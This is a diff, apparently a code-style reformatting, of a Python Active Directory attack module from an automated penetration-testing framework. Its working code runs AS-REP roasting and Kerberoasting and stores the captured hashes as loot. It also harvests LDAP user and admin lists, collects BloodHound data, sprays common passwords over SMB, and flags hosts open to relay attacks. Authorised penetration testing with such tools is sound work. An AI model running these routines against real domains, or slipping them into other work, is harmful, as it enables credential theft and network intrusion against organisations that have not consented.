@@ -67,7 +67,9 @@ class ActiveDirectoryModule(BaseModule):
 
             # ── 2. AS-REP Roasting (no creds needed) ──
             if domain:
-                dc_results["asrep_roast"] = self._asrep_roast(dc_ip, domain, dc_results.get("ldap", {}))
+                dc_results["asrep_roast"] = self._asrep_roast(
+                    dc_ip, domain, dc_results.get("ldap", {})
+                )
 
             # ── 3. Kerberoasting (needs creds) ──
             if has_creds and domain:
@@ -75,16 +77,22 @@ class ActiveDirectoryModule(BaseModule):
 
             # ── 4. BloodHound Collection (needs creds) ──
             if has_creds and domain and is_tool_available("bloodhound-python"):
-                dc_results["bloodhound"] = self._bloodhound_collect(dc_ip, domain, credentials)
+                dc_results["bloodhound"] = self._bloodhound_collect(
+                    dc_ip, domain, credentials
+                )
 
             # ── 5. Password Spraying ──
             users = dc_results.get("ldap", {}).get("users", [])
             if users and not self.config.get("exploitation", "safe_mode", default=True):
-                dc_results["password_spray"] = self._password_spray(dc_ip, domain, users)
+                dc_results["password_spray"] = self._password_spray(
+                    dc_ip, domain, users
+                )
 
             # ── 6. Domain Trust Mapping ──
             if has_creds:
-                dc_results["trusts"] = self._enumerate_trusts(dc_ip, domain, credentials)
+                dc_results["trusts"] = self._enumerate_trusts(
+                    dc_ip, domain, credentials
+                )
 
             # ── 7. GPO Enumeration ──
             if has_creds:
@@ -106,18 +114,19 @@ class ActiveDirectoryModule(BaseModule):
 
         for host in hosts:
             open_ports = {
-                p["port"] for p in host.get("ports", [])
-                if p.get("state") == "open"
+                p["port"] for p in host.get("ports", []) if p.get("state") == "open"
             }
             # DC heuristic: has LDAP (389) + Kerberos (88) + SMB (445)
             dc_score = len(open_ports & dc_ports)
             if 389 in open_ports and 88 in open_ports:
-                dcs.append({
-                    "ip": host.get("ip", ""),
-                    "hostname": host.get("hostname", ""),
-                    "dc_score": dc_score,
-                    "open_ports": sorted(open_ports & dc_ports),
-                })
+                dcs.append(
+                    {
+                        "ip": host.get("ip", ""),
+                        "hostname": host.get("hostname", ""),
+                        "dc_score": dc_score,
+                        "open_ports": sorted(open_ports & dc_ports),
+                    }
+                )
 
         return sorted(dcs, key=lambda x: -x["dc_score"])
 
@@ -129,22 +138,28 @@ class ActiveDirectoryModule(BaseModule):
             result = self.runner.run(
                 tool_name="ldapsearch",
                 args=[
-                    "-x", "-H", f"ldap://{ip}",
-                    "-s", "base",
-                    "-b", "",
+                    "-x",
+                    "-H",
+                    f"ldap://{ip}",
+                    "-s",
+                    "base",
+                    "-b",
+                    "",
                     "defaultNamingContext",
                 ],
-                timeout=15, retries=0,
+                timeout=15,
+                retries=0,
             )
             if result.success and result.stdout:
                 match = re.search(
-                    r'defaultNamingContext:\s*(.+)',
-                    result.stdout, re.IGNORECASE,
+                    r"defaultNamingContext:\s*(.+)",
+                    result.stdout,
+                    re.IGNORECASE,
                 )
                 if match:
                     dn = match.group(1).strip()
                     # Convert DC=lab,DC=local → lab.local
-                    parts = re.findall(r'DC=([^,]+)', dn, re.IGNORECASE)
+                    parts = re.findall(r"DC=([^,]+)", dn, re.IGNORECASE)
                     if parts:
                         return ".".join(parts)
 
@@ -157,9 +172,7 @@ class ActiveDirectoryModule(BaseModule):
 
         return ""
 
-    def _ldap_enumerate(
-        self, dc_ip: str, domain: str, credentials: List[Dict]
-    ) -> Dict:
+    def _ldap_enumerate(self, dc_ip: str, domain: str, credentials: List[Dict]) -> Dict:
         """LDAP enumeration — anonymous first, then authenticated."""
         ldap_results: Dict[str, Any] = {"users": [], "groups": [], "computers": []}
 
@@ -169,8 +182,12 @@ class ActiveDirectoryModule(BaseModule):
             result = self.runner.run(
                 tool_name="nmap",
                 args=[
-                    "-sV", "--script", "ldap-rootdse,ldap-search",
-                    "-p", "389,636", dc_ip,
+                    "-sV",
+                    "--script",
+                    "ldap-rootdse,ldap-search",
+                    "-p",
+                    "389,636",
+                    dc_ip,
                 ],
                 timeout=60,
                 output_file=f"enum/ldap_{dc_ip}.txt",
@@ -186,11 +203,17 @@ class ActiveDirectoryModule(BaseModule):
         anon_result = self.runner.run(
             tool_name="ldapsearch",
             args=[
-                "-x", "-H", f"ldap://{dc_ip}",
-                "-b", base_dn,
-                "-s", "sub",
+                "-x",
+                "-H",
+                f"ldap://{dc_ip}",
+                "-b",
+                base_dn,
+                "-s",
+                "sub",
                 "(objectClass=user)",
-                "sAMAccountName", "mail", "memberOf",
+                "sAMAccountName",
+                "mail",
+                "memberOf",
             ],
             timeout=60,
             output_file=f"enum/ldap_anon_{dc_ip}.txt",
@@ -200,7 +223,7 @@ class ActiveDirectoryModule(BaseModule):
         if anon_result.success and "sAMAccountName" in anon_result.stdout:
             ldap_results["anonymous_bind"] = True
             logger.warning(f"  [!] LDAP anonymous bind successful on {dc_ip}")
-            users = re.findall(r'sAMAccountName:\s*(\S+)', anon_result.stdout)
+            users = re.findall(r"sAMAccountName:\s*(\S+)", anon_result.stdout)
             ldap_results["users"] = users[:500]  # Cap
             logger.info(f"  LDAP users found: {len(users)}")
         else:
@@ -216,13 +239,24 @@ class ActiveDirectoryModule(BaseModule):
                 auth_result = self.runner.run(
                     tool_name="ldapsearch",
                     args=[
-                        "-x", "-H", f"ldap://{dc_ip}",
-                        "-D", bind_dn, "-w", passwd,
-                        "-b", base_dn,
-                        "-s", "sub",
+                        "-x",
+                        "-H",
+                        f"ldap://{dc_ip}",
+                        "-D",
+                        bind_dn,
+                        "-w",
+                        passwd,
+                        "-b",
+                        base_dn,
+                        "-s",
+                        "sub",
                         "(objectClass=user)",
-                        "sAMAccountName", "adminCount", "servicePrincipalName",
-                        "userAccountControl", "memberOf", "lastLogon",
+                        "sAMAccountName",
+                        "adminCount",
+                        "servicePrincipalName",
+                        "userAccountControl",
+                        "memberOf",
+                        "lastLogon",
                     ],
                     timeout=120,
                     output_file=f"enum/ldap_auth_{dc_ip}.txt",
@@ -231,20 +265,22 @@ class ActiveDirectoryModule(BaseModule):
 
                 if auth_result.success:
                     ldap_results["authenticated"] = True
-                    users = re.findall(r'sAMAccountName:\s*(\S+)', auth_result.stdout)
+                    users = re.findall(r"sAMAccountName:\s*(\S+)", auth_result.stdout)
                     ldap_results["users"] = users[:1000]
 
                     # Find admin accounts
                     admins = re.findall(
-                        r'sAMAccountName:\s*(\S+).*?adminCount:\s*1',
-                        auth_result.stdout, re.DOTALL,
+                        r"sAMAccountName:\s*(\S+).*?adminCount:\s*1",
+                        auth_result.stdout,
+                        re.DOTALL,
                     )
                     ldap_results["admin_accounts"] = admins
 
                     # Find SPN accounts (Kerberoastable)
                     spn_users = re.findall(
-                        r'sAMAccountName:\s*(\S+).*?servicePrincipalName:',
-                        auth_result.stdout, re.DOTALL,
+                        r"sAMAccountName:\s*(\S+).*?servicePrincipalName:",
+                        auth_result.stdout,
+                        re.DOTALL,
                     )
                     ldap_results["spn_accounts"] = spn_users
 
@@ -258,17 +294,23 @@ class ActiveDirectoryModule(BaseModule):
         group_result = self.runner.run(
             tool_name="ldapsearch",
             args=[
-                "-x", "-H", f"ldap://{dc_ip}",
-                "-b", base_dn, "-s", "sub",
+                "-x",
+                "-H",
+                f"ldap://{dc_ip}",
+                "-b",
+                base_dn,
+                "-s",
+                "sub",
                 "(objectClass=group)",
-                "cn", "member",
+                "cn",
+                "member",
             ],
             timeout=60,
             output_file=f"enum/ldap_groups_{dc_ip}.txt",
             retries=0,
         )
         if group_result.success:
-            groups = re.findall(r'cn:\s*(.+)', group_result.stdout)
+            groups = re.findall(r"cn:\s*(.+)", group_result.stdout)
             ldap_results["groups"] = groups[:200]
 
         return ldap_results
@@ -290,9 +332,12 @@ class ActiveDirectoryModule(BaseModule):
 
         args = [
             f"{domain}/",
-            "-dc-ip", dc_ip,
-            "-format", "hashcat",
-            "-outputfile", str(self.session_dir / f"loot/asrep_hashes_{dc_ip}.txt"),
+            "-dc-ip",
+            dc_ip,
+            "-format",
+            "hashcat",
+            "-outputfile",
+            str(self.session_dir / f"loot/asrep_hashes_{dc_ip}.txt"),
         ]
 
         if user_file:
@@ -312,15 +357,18 @@ class ActiveDirectoryModule(BaseModule):
         if result.success:
             hash_file = self.session_dir / f"loot/asrep_hashes_{dc_ip}.txt"
             if hash_file.exists():
-                hashes = [line for line in hash_file.read_text().split("\n") if line.strip()]
+                hashes = [
+                    line for line in hash_file.read_text().split("\n") if line.strip()
+                ]
                 asrep_data["hashes_found"] = len(hashes)
                 if hashes:
                     logger.warning(f"  [!] AS-REP hashes found: {len(hashes)}")
                     # Store in credential vault if available
-                    if hasattr(self, 'credential_vault') and self.credential_vault:
+                    if hasattr(self, "credential_vault") and self.credential_vault:
                         from utils.credential_vault import CredType
+
                         for h in hashes:
-                            user_match = re.match(r'\$krb5asrep\$23\$([^@]+)', h)
+                            user_match = re.match(r"\$krb5asrep\$23\$([^@]+)", h)
                             if user_match:
                                 self.credential_vault.add_hash(
                                     username=user_match.group(1),
@@ -350,7 +398,8 @@ class ActiveDirectoryModule(BaseModule):
                     tool_name="impacket-GetUserSPNs",
                     args=[
                         f"{domain}/{user}:{passwd}",
-                        "-dc-ip", dc_ip,
+                        "-dc-ip",
+                        dc_ip,
                         "-request",
                         "-outputfile",
                         str(self.session_dir / f"loot/kerberoast_{dc_ip}.txt"),
@@ -364,7 +413,11 @@ class ActiveDirectoryModule(BaseModule):
                 if result.success:
                     hash_file = self.session_dir / f"loot/kerberoast_{dc_ip}.txt"
                     if hash_file.exists():
-                        hashes = [line for line in hash_file.read_text().split("\n") if line.strip()]
+                        hashes = [
+                            line
+                            for line in hash_file.read_text().split("\n")
+                            if line.strip()
+                        ]
                         kerb_data["hashes_found"] = len(hashes)
                         if hashes:
                             logger.warning(f"  [!] Kerberoast hashes: {len(hashes)}")
@@ -390,14 +443,21 @@ class ActiveDirectoryModule(BaseModule):
                 result = self.runner.run(
                     tool_name="bloodhound-python",
                     args=[
-                        "-c", "All",
-                        "-u", user,
-                        "-p", passwd,
-                        "-d", domain,
-                        "-dc", dc_ip,
-                        "-ns", dc_ip,
+                        "-c",
+                        "All",
+                        "-u",
+                        user,
+                        "-p",
+                        passwd,
+                        "-d",
+                        domain,
+                        "-dc",
+                        dc_ip,
+                        "-ns",
+                        dc_ip,
                         "--zip",
-                        "--output-prefix", str(bh_output / "bh"),
+                        "--output-prefix",
+                        str(bh_output / "bh"),
                     ],
                     timeout=300,
                     output_file=f"loot/bloodhound_{dc_ip}_stdout.txt",
@@ -417,9 +477,7 @@ class ActiveDirectoryModule(BaseModule):
 
         return {"no_creds": True}
 
-    def _password_spray(
-        self, dc_ip: str, domain: str, users: List[str]
-    ) -> Dict:
+    def _password_spray(self, dc_ip: str, domain: str, users: List[str]) -> Dict:
         """Password spraying against discovered AD users."""
         if not is_tool_available("crackmapexec") and not is_tool_available("nxc"):
             return {"available": False}
@@ -428,9 +486,12 @@ class ActiveDirectoryModule(BaseModule):
 
         cme_binary = "crackmapexec" if is_tool_available("crackmapexec") else "nxc"
         spray_passwords = self.config.get("ad", default={}).get(
-            "spray_passwords", ["Password1", "Welcome1", "Company123", "Spring2025", "Summer2025"]
+            "spray_passwords",
+            ["Password1", "Welcome1", "Company123", "Spring2025", "Summer2025"],
         )
-        lockout_threshold = self.config.get("credentials", "spray_lockout_threshold", default=3)
+        lockout_threshold = self.config.get(
+            "credentials", "spray_lockout_threshold", default=3
+        )
         spray_delay = self.config.get("credentials", "spray_delay", default=30)
 
         spray_results: Dict[str, Any] = {"attempts": 0, "successes": []}
@@ -440,16 +501,21 @@ class ActiveDirectoryModule(BaseModule):
         user_file.write_text("\n".join(users[:200]))
 
         import time
+
         for pwd in spray_passwords[:lockout_threshold]:
             logger.info(f"  Spraying password: {pwd[:2]}*** against {len(users)} users")
 
             result = self.runner.run(
                 tool_name=cme_binary,
                 args=[
-                    "smb", dc_ip,
-                    "-u", str(user_file),
-                    "-p", pwd,
-                    "-d", domain,
+                    "smb",
+                    dc_ip,
+                    "-u",
+                    str(user_file),
+                    "-p",
+                    pwd,
+                    "-d",
+                    domain,
                     "--continue-on-success",
                 ],
                 timeout=120,
@@ -463,10 +529,12 @@ class ActiveDirectoryModule(BaseModule):
                 # Extract successful logins
                 for line in result.stdout.split("\n"):
                     if "[+]" in line or "Pwn3d" in line:
-                        spray_results["successes"].append({
-                            "password": pwd,
-                            "output": line.strip(),
-                        })
+                        spray_results["successes"].append(
+                            {
+                                "password": pwd,
+                                "output": line.strip(),
+                            }
+                        )
                         logger.warning(f"  [!] SPRAY HIT: {line.strip()}")
 
             # Delay between rounds
@@ -484,8 +552,10 @@ class ActiveDirectoryModule(BaseModule):
         result = self.runner.run(
             tool_name="nmap",
             args=[
-                "--script", "ldap-rootdse",
-                "-p", "389",
+                "--script",
+                "ldap-rootdse",
+                "-p",
+                "389",
                 dc_ip,
             ],
             timeout=30,
@@ -498,9 +568,7 @@ class ActiveDirectoryModule(BaseModule):
             trust_data["raw"] = result.stdout[:3000]
         return trust_data
 
-    def _enumerate_gpo(
-        self, dc_ip: str, domain: str, credentials: List[Dict]
-    ) -> Dict:
+    def _enumerate_gpo(self, dc_ip: str, domain: str, credentials: List[Dict]) -> Dict:
         """Enumerate Group Policy Objects."""
         if not is_tool_available("ldapsearch"):
             return {"available": False}
@@ -515,12 +583,20 @@ class ActiveDirectoryModule(BaseModule):
                 result = self.runner.run(
                     tool_name="ldapsearch",
                     args=[
-                        "-x", "-H", f"ldap://{dc_ip}",
-                        "-D", f"{user}@{domain}", "-w", passwd,
-                        "-b", f"CN=Policies,CN=System,{base_dn}",
-                        "-s", "sub",
+                        "-x",
+                        "-H",
+                        f"ldap://{dc_ip}",
+                        "-D",
+                        f"{user}@{domain}",
+                        "-w",
+                        passwd,
+                        "-b",
+                        f"CN=Policies,CN=System,{base_dn}",
+                        "-s",
+                        "sub",
                         "(objectClass=groupPolicyContainer)",
-                        "displayName", "gPCFileSysPath",
+                        "displayName",
+                        "gPCFileSysPath",
                     ],
                     timeout=60,
                     output_file=f"enum/ad_gpo_{dc_ip}.txt",
@@ -529,13 +605,15 @@ class ActiveDirectoryModule(BaseModule):
 
                 gpo_data: Dict[str, Any] = {"gpos": []}
                 if result.success:
-                    names = re.findall(r'displayName:\s*(.+)', result.stdout)
-                    paths = re.findall(r'gPCFileSysPath:\s*(.+)', result.stdout)
+                    names = re.findall(r"displayName:\s*(.+)", result.stdout)
+                    paths = re.findall(r"gPCFileSysPath:\s*(.+)", result.stdout)
                     for name, path in zip(names, paths):
-                        gpo_data["gpos"].append({
-                            "name": name.strip(),
-                            "path": path.strip(),
-                        })
+                        gpo_data["gpos"].append(
+                            {
+                                "name": name.strip(),
+                                "path": path.strip(),
+                            }
+                        )
                     logger.info(f"  GPOs found: {len(gpo_data['gpos'])}")
 
                 return gpo_data
@@ -547,8 +625,10 @@ class ActiveDirectoryModule(BaseModule):
         result = self.runner.run(
             tool_name="nmap",
             args=[
-                "--script", "smb2-security-mode",
-                "-p", "445",
+                "--script",
+                "smb2-security-mode",
+                "-p",
+                "445",
                 dc_ip,
             ],
             timeout=30,
@@ -557,10 +637,15 @@ class ActiveDirectoryModule(BaseModule):
 
         signing_data: Dict[str, Any] = {"enforced": True}
         if result.success and result.stdout:
-            if "not required" in result.stdout.lower() or "signing disabled" in result.stdout.lower():
+            if (
+                "not required" in result.stdout.lower()
+                or "signing disabled" in result.stdout.lower()
+            ):
                 signing_data["enforced"] = False
                 signing_data["vulnerable_to_relay"] = True
-                logger.warning(f"  [!] SMB signing NOT enforced on {dc_ip} — relay attacks possible")
+                logger.warning(
+                    f"  [!] SMB signing NOT enforced on {dc_ip} — relay attacks possible"
+                )
             else:
                 signing_data["enforced"] = True
             signing_data["raw"] = result.stdout[:2000]
